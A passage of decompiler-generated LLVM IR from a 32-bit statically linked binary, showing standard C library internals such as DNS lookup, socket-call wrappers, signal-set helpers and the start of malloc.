  %v0_804fceb = load i32, i32* @edi, align 4
  %v1_804fceb = load i32, i32* @ebp, align 4
  %v2_804fceb = add i32 %v1_804fceb, 12
  %v3_804fceb = inttoptr i32 %v2_804fceb to i32*
  store i32 %v0_804fceb, i32* %v3_804fceb, align 4
  %v1_804fcf2 = add i32 %v0_804fcd2, 16
  %v2_804fcf2 = inttoptr i32 %v1_804fcf2 to i32*
  store i32 0, i32* %v2_804fcf2, align 4
  %v2_804fcf9 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804fcf9, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_804fcfb = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_804fd00 = inttoptr i32 %arg1 to i8*
  %v3_804fd00 = call i32 @inet_aton(i8* %v2_804fd00, i32 %v0_804fcfb)
  store i32 %v3_804fd00, i32* %eax.global-to-local, align 4
  %v1_804fd08 = icmp eq i32 %v3_804fd00, 0
  br i1 %v1_804fd08, label %dec_label_pc_804fd44, label %dec_label_pc_804fd0c

dec_label_pc_804fd0c:                             ; preds = %dec_label_pc_804fcd2
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_804fd10 = load i32, i32* @edi, align 4
  store i32 %v0_804fd10, i32* %arg2, align 4
  %v1_804fd12 = add i32 %tmp18, 8
  %v2_804fd12 = inttoptr i32 %v1_804fd12 to i32*
  store i32 2, i32* %v2_804fd12, align 4
  %v0_804fd19 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fd19 = add i32 %v0_804fd19, 12
  %v2_804fd19 = inttoptr i32 %v1_804fd19 to i32*
  store i32 4, i32* %v2_804fd19, align 4
  %v2_804fd20 = load i32, i32* %stack_var_-92, align 4
  %v1_804fd23 = load i32, i32* %edx.global-to-local, align 4
  %v2_804fd23 = add i32 %v1_804fd23, 16
  %v3_804fd23 = inttoptr i32 %v2_804fd23 to i32*
  store i32 %v2_804fd20, i32* %v3_804fd23, align 4
  %v1_804fd2a = load i32, i32* %edx.global-to-local, align 4
  %v2_804fd2a = add i32 %v1_804fd2a, 4
  %v3_804fd2a = inttoptr i32 %v2_804fd2a to i32*
  store i32 %v1_804fcd2, i32* %v3_804fd2a, align 4
  %v0_804fd31 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804fd31, i32* %v1_804fc03, align 4
  store i32 0, i32* %v1_804fc51, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ff1a

dec_label_pc_804fd44:                             ; preds = %dec_label_pc_804fcd2
  %v0_804fd44 = call i32 @__open_nameservers()
  store i32 %v0_804fd44, i32* @eax, align 4
  %v2_804fd54 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_804fd54, i32* @ebx, align 4
  store i32 %v2_804fd54, i32* %stack_var_-108, align 4
  %v2_804fd59 = call i32 @__pthread_return_void(i32 %v2_804fd54, i32 134552351)
  store i32 %v2_804fd59, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805a048.183 to i32), i32* %stack_var_-108, align 4
  %v1_804fd65 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a048.183 to i32))
  %v0_804fd6a = load i32, i32* @global_var_8060734.184, align 4
  store i32 %v0_804fd6a, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_805a048.183 to i32), i32* @ecx, align 4
  store i32 134552351, i32* @eax, align 4
  store i32 %v2_804fd54, i32* %stack_var_-108, align 4
  %v2_804fd75 = call i32 @__pthread_return_void(i32 %v2_804fd54, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_804fd90 = ptrtoint i32* %stack_var_-76 to i32
  %v2_804fd95 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804fd95, i32* %eax.global-to-local, align 4
  store i32 %v2_804fd95, i32* %stack_var_-108, align 4
  %v0_804fd9f = load i32, i32* @esi, align 4
  %v7_804fda6 = call i32 @__dns_lookup(i8* %v2_804fd00, i32 1, i32 %v0_804fd9f, i32 ptrtoint (i32* @global_var_8060728.185 to i32), i32 %v2_804fd95, i32 %v2_804fd90)
  store i32 %v7_804fda6, i32* %eax.global-to-local, align 4
  %v2_804fdae = icmp slt i32 %v7_804fda6, 0
  %v1_804fdb0 = icmp eq i1 %v2_804fdae, false
  br i1 %v1_804fdb0, label %dec_label_pc_804fdc6, label %dec_label_pc_804fdb2

dec_label_pc_804fdb2:                             ; preds = %dec_label_pc_804fd44
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_804fc51, align 4
  br label %dec_label_pc_804ff1a

dec_label_pc_804fdc6:                             ; preds = %dec_label_pc_804fd44
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_804fdd9 = icmp ugt i32 %v1_804fcbf, 256
  %v15_804fdd9 = icmp eq i32 %v0_804fcbf, 300
  %v2_804fddd = or i1 %v10_804fdd9, %v15_804fdd9
  br i1 %v2_804fddd, label %dec_label_pc_804fe78, label %dec_label_pc_804fddf

dec_label_pc_804fddf:                             ; preds = %dec_label_pc_804fdc6
  %v3_804fde2 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804fde2, i32* %stack_var_-108, align 4
  %v1_804fde6 = call i32 @free(i32 %v3_804fde2)
  store i32 %v1_804fde6, i32* %eax.global-to-local, align 4
  store i32 %v3_804fde2, i32* @edi, align 4
  %v3_804fdec = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804fdec, i32* %stack_var_-108, align 4
  %v1_804fdf0 = call i32 @free(i32 %v3_804fdec)
  store i32 -1, i32* %v1_804fc51, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fef0

dec_label_pc_804fe78:                             ; preds = %dec_label_pc_804fdc6
  %v3_804fe7d.pre = load i32, i32* %stack_var_-76, align 4
  %v0_804fe81.pre = load i32, i32* @edi, align 4
  store i32 %v0_804fe81.pre, i32* %stack_var_-108, align 4
  %v3_804fe82 = inttoptr i32 %v0_804fe81.pre to i8*
  %v4_804fe82 = call i32 @strncpy(i8* %v3_804fe82, i32 %v3_804fe7d.pre, i32 %v1_804fcbf)
  store i32 %v4_804fe82, i32* %eax.global-to-local, align 4
  %v3_804fe88 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804fe88, i32* %stack_var_-108, align 4
  %v1_804fe8c = call i32 @free(i32 %v3_804fe88)
  store i32 %v1_804fe8c, i32* %eax.global-to-local, align 4
  %v12_804fe94 = icmp eq i32 %tmp10, 1
  %v1_804fe99 = icmp eq i1 %v12_804fe94, false
  br i1 %v1_804fe99, label %dec_label_pc_804fef5, label %dec_label_pc_804fe9b

dec_label_pc_804fe9b:                             ; preds = %dec_label_pc_804fe78
  %v0_804fe9b = load i32, i32* @edx, align 4
  %v0_804fea2 = load i32, i32* @ebp, align 4
  store i32 %v0_804fea2, i32* %stack_var_-108, align 4
  %v3_804fea3 = inttoptr i32 %tmp to i16*
  %v4_804fea3 = call i32 @memcpy(i16* %v3_804fea3, i32 4, i32 %v0_804fe9b)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_804feac = load i32, i32* @edi, align 4
  store i32 %v0_804feac, i32* %arg2, align 4
  %v1_804feae = add i32 %tmp18, 8
  %v2_804feae = inttoptr i32 %v1_804feae to i32*
  store i32 2, i32* %v2_804feae, align 4
  %v0_804feb5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804feb5 = add i32 %v0_804feb5, 12
  %v2_804feb5 = inttoptr i32 %v1_804feb5 to i32*
  store i32 4, i32* %v2_804feb5, align 4
  %v3_804febc = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_804febc, i32* %edx.global-to-local, align 4
  %v1_804fec0 = load i32, i32* %eax.global-to-local, align 4
  %v2_804fec0 = add i32 %v1_804fec0, 16
  %v3_804fec0 = inttoptr i32 %v2_804fec0 to i32*
  store i32 %v3_804febc, i32* %v3_804fec0, align 4
  %v1_804fec7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804fec7 = add i32 %v1_804fec7, 4
  %v3_804fec7 = inttoptr i32 %v2_804fec7 to i32*
  store i32 %v1_804fcd2, i32* %v3_804fec7, align 4
  %v2_804feca = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804feca, i32* %eax.global-to-local, align 4
  %v3_804fecb = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804fecb, i32* %stack_var_-108, align 4
  %v1_804fecf = call i32 @free(i32 %v3_804fecb)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_804fc03, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804fc51, align 4
  br label %dec_label_pc_804fef0

dec_label_pc_804fef0:                             ; preds = %dec_label_pc_804fef5, %dec_label_pc_804fddf, %dec_label_pc_804fe9b
  br label %dec_label_pc_804ff1a

dec_label_pc_804fef5:                             ; preds = %dec_label_pc_804fe78
  %v3_804fef8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804fef8, i32* %stack_var_-108, align 4
  %v1_804fefc = call i32 @free(i32 %v3_804fef8)
  store i32 1, i32* %v1_804fc51, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fef0

dec_label_pc_804ff15:                             ; preds = %dec_label_pc_804fcbf, %dec_label_pc_804fca3, %dec_label_pc_804fc97, %dec_label_pc_804fc84, %dec_label_pc_804fc78
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ff1a

dec_label_pc_804ff1a:                             ; preds = %dec_label_pc_804fc64, %dec_label_pc_804fc5d, %dec_label_pc_804fc19, %entry, %dec_label_pc_804fef0, %dec_label_pc_804fdb2, %dec_label_pc_804fd0c, %dec_label_pc_804ff15
  store i32 %v0_804fbf3, i32* @ebx, align 4
  store i32 %v0_804fbf2, i32* @esi, align 4
  store i32 %v0_804fbf1, i32* @edi, align 4
  store i32 %v0_804fbf0, i32* @ebp, align 4
  %v0_804ff21 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804ff21

; uselistorder directives
  uselistorder i32 %v2_804fd54, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_804fcd9, { 1, 0, 2 }
  uselistorder i32 %v1_804fcd2, { 1, 0 }
  uselistorder i32 %v1_804fcbf, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_804fc88.pre, { 0, 2, 1 }
  uselistorder i32 %v1_804fc71, { 1, 0 }
  uselistorder i32 %v2_804fc51, { 2, 0, 1, 3 }
  uselistorder i32* %v1_804fc51, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_804fc03, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 27, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804ff1a, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804fef0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fc84, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804ff3f = ptrtoint i32* %stack_var_-12 to i32
  %v2_804ff46 = call i32 @__socketcall(i32 3, i32 %v2_804ff3f)
  ret i32 %v2_804ff46

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804ff6b = ptrtoint i32* %stack_var_-12 to i32
  %v2_804ff72 = call i32 @__socketcall(i32 6, i32 %v2_804ff6b)
  ret i32 %v2_804ff72

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_804ffa7 = ptrtoint i32* %stack_var_-20 to i32
  %v2_804ffae = call i32 @__socketcall(i32 15, i32 %v2_804ffa7)
  ret i32 %v2_804ffae

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804ffdb = ptrtoint i32* %stack_var_-16 to i32
  %v2_804ffe2 = call i32 @__socketcall(i32 10, i32 %v2_804ffdb)
  ret i32 %v2_804ffe2

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_805000f = ptrtoint i32* %stack_var_-16 to i32
  %v2_8050016 = call i32 @__socketcall(i32 9, i32 %v2_805000f)
  ret i32 %v2_8050016

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_8050053 = ptrtoint i32* %stack_var_-24 to i32
  %v2_805005a = call i32 @__socketcall(i32 11, i32 %v2_8050053)
  ret i32 %v2_805005a

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_805008f = ptrtoint i32* %stack_var_-20 to i32
  %v2_8050096 = call i32 @__socketcall(i32 14, i32 %v2_805008f)
  ret i32 %v2_8050096

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80500bb = ptrtoint i32* %stack_var_-12 to i32
  %v2_80500c2 = call i32 @__socketcall(i32 1, i32 %v2_80500bb)
  ret i32 %v2_80500c2

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 5, 4, 7, 0, 1, 3, 6, 2 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_80500e4, label %dec_label_pc_80500d7

dec_label_pc_80500d7:                             ; preds = %entry
  %v1_80500d7 = add i32 %arg1, -64
  %v3_80500d7 = sub i32 63, %arg1
  %v4_80500d7 = and i32 %v3_80500d7, %arg1
  %v5_80500d7 = icmp slt i32 %v4_80500d7, 0
  %v6_80500d7 = icmp eq i32 %v1_80500d7, 0
  %v7_80500d7 = icmp slt i32 %v1_80500d7, 0
  %v3_80500da = icmp eq i1 %v7_80500d7, %v5_80500d7
  %v4_80500da = icmp eq i1 %v6_80500d7, false
  %v5_80500da = and i1 %v4_80500da, %v3_80500da
  br i1 %v5_80500da, label %dec_label_pc_80500e4, label %dec_label_pc_80500dc

dec_label_pc_80500dc:                             ; preds = %dec_label_pc_80500d7
  %v4_80500df = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_80500e4

dec_label_pc_80500e4:                             ; preds = %dec_label_pc_80500d7, %entry, %dec_label_pc_80500dc
  %v1_80500e4 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_80500e9 = inttoptr i32 %v1_80500e4 to i32*
  store i32 22, i32* %v1_80500e9, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_80500d7, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80500e4, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8050106 = inttoptr i32 %arg1 to i8*
  %v4_8050106 = call i32 @__GI_memset(i8* %v3_8050106, i32 0, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_8050114 = load i32, i32* @ebx, align 4
  %v15_8050115 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_8050129 = icmp eq i32 %arg2, -1
  br i1 %v10_8050129, label %dec_label_pc_8050137, label %dec_label_pc_805012e

dec_label_pc_805012e:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_8050137, label %dec_label_pc_8050132

dec_label_pc_8050132:                             ; preds = %dec_label_pc_805012e
  %v7_8050135 = icmp sgt i32 %arg1, 64
  br i1 %v7_8050135, label %dec_label_pc_8050137, label %dec_label_pc_8050144

dec_label_pc_8050137:                             ; preds = %dec_label_pc_8050132, %dec_label_pc_805012e, %entry
  %v1_8050137 = call i32 @__errno_location(i32 %v0_8050114)
  store i32 %v1_8050137, i32* %eax.global-to-local, align 4
  %v1_805013c = inttoptr i32 %v1_8050137 to i32*
  store i32 22, i32* %v1_805013c, align 4
  br label %dec_label_pc_80501b8

dec_label_pc_8050144:                             ; preds = %dec_label_pc_8050132
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050152

dec_label_pc_8050152:                             ; preds = %dec_label_pc_8050152.dec_label_pc_8050152_crit_edge, %dec_label_pc_8050144
  %v0_8050152 = phi i32 [ %v15_8050115, %dec_label_pc_8050144 ], [ %v0_8050152.pre, %dec_label_pc_8050152.dec_label_pc_8050152_crit_edge ]
  %v1_805015d17 = phi i32 [ 31, %dec_label_pc_8050144 ], [ %v1_805015d, %dec_label_pc_8050152.dec_label_pc_8050152_crit_edge ]
  %v2_8050152 = mul i32 %v1_805015d17, 4
  %v3_8050152 = add i32 %v2_8050152, 160
  %v4_8050152 = add i32 %v3_8050152, %v0_8050152
  %v5_8050152 = inttoptr i32 %v4_8050152 to i32*
  store i32 0, i32* %v5_8050152, align 4
  %v0_805015d.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_805015d = add i32 %v0_805015d.pre, -1
  %v9_805015d = icmp slt i32 %v1_805015d, 0
  store i32 %v1_805015d, i32* %eax.global-to-local, align 4
  %v1_805015e = icmp eq i1 %v9_805015d, false
  br i1 %v1_805015e, label %dec_label_pc_8050152.dec_label_pc_8050152_crit_edge, label %dec_label_pc_8050160

dec_label_pc_8050152.dec_label_pc_8050152_crit_edge: ; preds = %dec_label_pc_8050152
  %v0_8050152.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050152

dec_label_pc_8050160:                             ; preds = %dec_label_pc_8050152
  %v0_8050160 = load i32, i32* @edx, align 4
  %v2_8050163 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_8050163, i32* %eax.global-to-local, align 4
  %v4_805016b = call i32 @__sigaddset(i32 %v2_8050163, i32 %arg1, i32 %v0_8050160, i32 %v0_8050160)
  store i32 %v4_805016b, i32* %eax.global-to-local, align 4
  %v2_8050173 = icmp slt i32 %v4_805016b, 0
  br i1 %v2_8050173, label %dec_label_pc_80501b8, label %dec_label_pc_8050177

dec_label_pc_8050177:                             ; preds = %dec_label_pc_8050160
  %v4_805017f = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_8060320.186 to i32), i32 %arg1, i32 %v4_805016b, i32 %v4_805016b)
  %v2_8050198 = ptrtoint i32* %stack_var_-284 to i32
  %v2_805019d = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_805019d, i32* %eax.global-to-local, align 4
  %v4_80501a6 = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_8050198)
  store i32 %v4_80501a6, i32* %eax.global-to-local, align 4
  %v2_80501ae = icmp slt i32 %v4_80501a6, 0
  br i1 %v2_80501ae, label %dec_label_pc_80501b8, label %dec_label_pc_80501b2

dec_label_pc_80501b2:                             ; preds = %dec_label_pc_8050177
  %v3_80501b2 = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_80501bb

dec_label_pc_80501b8:                             ; preds = %dec_label_pc_8050177, %dec_label_pc_8050160, %dec_label_pc_8050137
  br label %dec_label_pc_80501bb

dec_label_pc_80501bb:                             ; preds = %dec_label_pc_80501b2, %dec_label_pc_80501b8
  %storemerge = phi i32 [ -1, %dec_label_pc_80501b8 ], [ %v3_80501b2, %dec_label_pc_80501b2 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8050114, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805015d, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 9, 0, 1, 2, 3, 4, 7, 8, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 0, 5 }
  uselistorder label %dec_label_pc_80501bb, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_80501d2 = add i32 %arg2, -1
  %v1_80501d5 = urem i32 %v1_80501d2, 32
  %v2_80501d5 = icmp eq i32 %v1_80501d5, 0
  %v2_80501d8 = udiv i32 %v1_80501d2, 32
  br i1 %v2_80501d5, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_80501db = shl i32 1, %v1_80501d5
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_80501dd = phi i32 [ 1, %entry ], [ %v5_80501db, %bb ]
  %v2_80501dd = mul nuw nsw i32 %v2_80501d8, 4
  %v3_80501dd = add i32 %v2_80501dd, %arg1
  %v4_80501dd = inttoptr i32 %v3_80501dd to i32*
  %v5_80501dd = load i32, i32* %v4_80501dd, align 4
  %v7_80501dd = and i32 %v5_80501dd, %v6_80501dd
  %v8_80501dd = icmp eq i32 %v7_80501dd, 0
  %v1_80501e1 = icmp eq i1 %v8_80501dd, false
  %v2_80501e1 = zext i1 %v1_80501e1 to i32
  ret i32 %v2_80501e1

; uselistorder directives
  uselistorder i32 %v1_80501d5, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80501e8 = load i32, i32* @ebx, align 4
  store i32 %v0_80501e8, i32* %stack_var_-4, align 4
  %v1_80501f6 = add i32 %arg2, -1
  %v1_80501f9 = urem i32 %v1_80501f6, 32
  %v2_80501f9 = icmp eq i32 %v1_80501f9, 0
  store i32 %v1_80501f9, i32* @ecx, align 4
  br i1 %v2_80501f9, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v5_80501fc = shl i32 1, %v1_80501f9
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_8050201 = phi i32 [ 1, %entry ], [ %v5_80501fc, %bb ]
  %v2_80501fe = udiv i32 %v1_80501f6, 32
  store i32 %v2_80501fe, i32* @edx, align 4
  %v2_8050201 = mul nuw nsw i32 %v2_80501fe, 4
  %v3_8050201 = add i32 %v2_8050201, %arg1
  %v4_8050201 = inttoptr i32 %v3_8050201 to i32*
  %v5_8050201 = load i32, i32* %v4_8050201, align 4
  %v7_8050201 = or i32 %v5_8050201, %v6_8050201
  store i32 %v7_8050201, i32* %v4_8050201, align 4
  %v2_8050206 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050206, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_80501fe, { 1, 0 }
  uselistorder i32 %v1_80501f9, { 2, 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8050216 = add i32 %arg2, -1
  %v1_8050219 = urem i32 %v1_8050216, 32
  %v2_8050219 = icmp eq i32 %v1_8050219, 0
  br i1 %v2_8050219, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v4_805021c = shl i32 -2, %v1_8050219
  %v5_805021c = sub nsw i32 32, %v1_8050219
  %v6_805021c = lshr i32 -2, %v5_805021c
  %v7_805021c = or i32 %v6_805021c, %v4_805021c
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_8050221 = phi i32 [ -2, %entry ], [ %v7_805021c, %bb ]
  %v2_805021e = udiv i32 %v1_8050216, 32
  %v2_8050221 = mul nuw nsw i32 %v2_805021e, 4
  %v3_8050221 = add i32 %v2_8050221, %arg1
  %v4_8050221 = inttoptr i32 %v3_8050221 to i32*
  %v5_8050221 = load i32, i32* %v4_8050221, align 4
  %v7_8050221 = and i32 %v5_8050221, %v6_8050221
  store i32 %v7_8050221, i32* %v4_8050221, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8050219, { 1, 2, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_8050228 = load i32, i32* @eax, align 4
  %v6_805023b = icmp ugt i32 %v0_8050228, 16777215
  br i1 %v6_805023b, label %dec_label_pc_805024c, label %dec_label_pc_805023d

dec_label_pc_805023d:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_8050228, 256
  %v2_805022a = udiv i32 %v0_8050228, 256
  %v2_805023d = call i32 @llvm.ctlz.i32(i32 %v2_805022a, i1 true)
  %v3_805023d = xor i32 %v2_805023d, 31
  %v5_805023d = select i1 %tmp, i32 95, i32 %v3_805023d
  %v1_8050240 = add nuw nsw i32 %v5_805023d, 6
  store i32 %v1_8050240, i32* @ecx, align 4
  %v2_8050243 = urem i32 %v1_8050240, 32
  %v4_8050243 = icmp eq i32 %v2_8050243, 0
  br i1 %v4_8050243, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_805023d
  %v5_8050243 = lshr i32 %v0_8050228, %v2_8050243
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_805023d, %bb
  %v0_8050245 = phi i32 [ %v0_8050228, %dec_label_pc_805023d ], [ %v5_8050243, %bb ]
  %v1_8050245 = urem i32 %v0_8050245, 4
  %v2_8050248 = mul nuw nsw i32 %v5_805023d, 4
  %v3_8050248 = or i32 %v1_8050245, 32
  %v4_8050248 = add nuw nsw i32 %v3_8050248, %v2_8050248
  br label %dec_label_pc_805024c

dec_label_pc_805024c:                             ; preds = %entry, %bb4
  %v0_805024d = phi i32 [ 95, %entry ], [ %v4_8050248, %bb4 ]
  ret i32 %v0_805024d

; uselistorder directives
  uselistorder i32 %v2_8050243, { 1, 0 }
  uselistorder i32 %v0_8050228, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_805024c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805024e = load i32, i32* @ebp, align 4
  %v0_805024f = load i32, i32* @edi, align 4
  %v0_8050250 = load i32, i32* @esi, align 4
  %v0_8050251 = load i32, i32* @ebx, align 4
  store i32 %v0_8050251, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8050263 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050263, i32* @eax, align 4
  store i32 %v2_8050263, i32* %stack_var_-92, align 4
  %v2_8050268 = call i32 @__pthread_return_void(i32 %v2_8050263, i32 134552351)
  store i32 %v2_8050268, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8059f30.187 to i32), i32* %stack_var_-92, align 4
  %v1_8050274 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059f30.187 to i32))
  store i32 %v1_8050274, i32* %eax.global-to-local, align 4
  %v0_805027c = load i32, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v0_805027c, -32
  br i1 %tmp, label %dec_label_pc_8050293, label %dec_label_pc_8050281

dec_label_pc_8050281:                             ; preds = %entry
  %v0_8050281 = load i32, i32* %stack_var_-92, align 4
